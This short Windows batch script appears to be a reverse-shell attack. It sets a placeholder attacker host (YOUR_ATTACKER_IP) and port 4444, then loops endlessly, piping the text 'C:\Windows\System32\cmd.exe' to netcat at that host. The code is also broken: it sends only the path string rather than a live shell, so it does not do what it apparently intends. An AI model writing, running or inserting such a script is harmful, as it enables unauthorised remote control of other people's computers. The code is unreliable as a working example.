@echo off
set host=YOUR_ATTACKER_IP
set port=4444

:loop
echo | set /p="C:\Windows\System32\cmd.exe" | nc %host% %port%
goto loop
